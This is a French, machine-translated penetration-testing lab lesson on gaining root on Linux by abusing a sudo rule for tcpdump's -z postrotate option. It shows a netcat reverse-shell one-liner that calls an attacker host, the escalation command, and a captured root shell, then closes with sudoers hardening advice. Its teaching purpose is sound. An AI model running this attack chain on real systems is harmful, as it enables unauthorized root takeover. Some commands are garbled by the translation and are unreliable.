Abus des droits Sudo
=================

* * * * *

Des privilèges Sudo peuvent être accordés à un compte, permettant au compte d'exécuter certaines commandes dans le contexte de la racine (ou d'un autre compte) sans avoir à changer d'utilisateur ou à accorder des privilèges excessifs. Lorsque la commande `sudo` est émise, le système vérifie si l'utilisateur qui émet la commande dispose des droits appropriés, comme configuré dans /etc/sudoers. Lors de l'atterrissage sur un système, nous devons toujours vérifier si l'utilisateur actuel dispose de privilèges sudo en tapant `sudo -l`. Parfois, nous aurons besoin de connaître le mot de passe de l'utilisateur pour répertorier ses droits `sudo` , mais toutes les entrées de droits avec l'option `NOPASSWD` sont visibles sans saisir de mot de passe.

```
htb_student@NIX02 :~$ sudo -l

Entrées par défaut correspondantes pour sysadm sur NIX02 :
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

L'utilisateur sysadm peut exécuter les commandes suivantes sur NIX02 :
     (racine) NOPASSWD : /usr/sbin/tcpdump

```

Il est facile de mal configurer cela. Par exemple, un utilisateur peut se voir accorder des autorisations de niveau racine sans avoir besoin d'un mot de passe. Ou la ligne de commande autorisée peut être spécifiée de manière trop vague, ce qui nous permet d'exécuter un programme de manière involontaire, ce qui entraîne une élévation des privilèges. Par exemple, si le fichier sudoers est modifié pour accorder à un utilisateur le droit d'exécuter une commande telle que `tcpdump` selon l'entrée suivante dans le fichier sudoers : `(ALL) NOPASSWD : /usr/sbin/tcpdump` un attaquant pourrait exploiter ceci pour tirer parti de l'option postrotate-command .

```
htb_student@NIX02 :~$ man tcpdump

<SNIP>
-z postrorate-commande

Utilisé en conjonction avec les options -C ou -G, cela fera exécuter `tcpdump` " postrotate-command file " où le fichier est le fichier de sauvegarde fermé après chaque rotation. Par exemple, spécifier -z gzip ou -z bzip2 compressera chaque fichier de sauvegarde à l'aide de gzip ou bzip2.

```

En spécifiant l'indicateur `-z` , un attaquant pourrait utiliser `tcpdump` pour exécuter un script shell, obtenir un shell inversé en tant qu'utilisateur root ou exécuter d'autres commandes privilégiées. Par exemple, un attaquant pourrait créer le script shell `.test` contenant un shell inversé et l'exécuter comme suit :

```
htb_student@NIX02 :~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

```

Essayons ça. Tout d'abord, créez un fichier à exécuter avec la `commande postrotate`, en ajoutant une simple ligne inversée de shell.

```
htb_student@NIX02 :~$ cat /tmp/.test

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f

```

Ensuite, démarrez un écouteur `netcat` sur notre boîte d'attaque, exécutez `tcpdump` en tant que root avec la `commande postrotate`. Si tout se passe comme prévu, nous recevrons une connexion root reverse shell.

```
htb_student@NIX02 :~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z racine

abandonné les privilèges à la racine
tcpdump : écoute sur ens192, type de lien EN10MB (Ethernet), taille de capture 262 144 octets
Limite maximale de fichiers atteinte : 1
1 paquet capturé
6 paquets reçus par filtre
compress_savefile : execlp(/tmp/.test, /dev/null) a échoué : autorisation refusée
0 paquet abandonné par le noyau

```

Nous recevons un shell racine presque instantanément.

```
dsgsec@htb[/htb]$ nc -lnvp 443

écoute sur [tout] 443 ...
se connecter à [10.10.14.3] depuis (INCONNU) [10.129.2.12] 38938
bash : impossible de définir le groupe de processus de terminal (10797) : ioctl inapproprié pour le périphérique
bash : pas de contrôle des tâches dans ce shell

root@NIX02 :~# id && nom d'hôte
identifiant && nom d'hôte
uid=0(racine) gid=0(racine) groupes=0(racine)
NIX02

```

[AppArmor](https://wiki.ubuntu.com/AppArmor) dans les distributions plus récentes, a prédéfini les commandes utilisées avec `postrotate-command`, empêchant efficacement l'exécution de la commande. Deux bonnes pratiques à toujours prendre en compte lors du provisionnement des droits `sudo` :

| | |
| --- | --- |
| 1. | Spécifiez toujours le chemin absolu vers tous les fichiers binaires répertoriés dans l'entrée de fichier `sudoers` . Sinon, un attaquant peut être en mesure d'exploiter l'abus de PATH (que nous verrons dans la section suivante) pour créer un binaire malveillant qui sera exécuté lors de l'exécution de la commande (c'est-à-dire si l'entrée `sudoers` spécifie `cat` au lieu de ` /bin/cat` cela pourrait probablement être abusé). |
| 2. | Accordez les droits `sudo` avec parcimonie et en vous basant sur le principe du moindre privilège. L'utilisateur a-t-il besoin de tous les droits `sudo` ? Peuvent-ils toujours effectuer leur travail avec une ou deux entrées dans le fichier `sudoers` ? Limiter la commande privilégiée qu'un utilisateur peut exécuter réduira considérablement la probabilité d'une élévation réussie des privilèges. |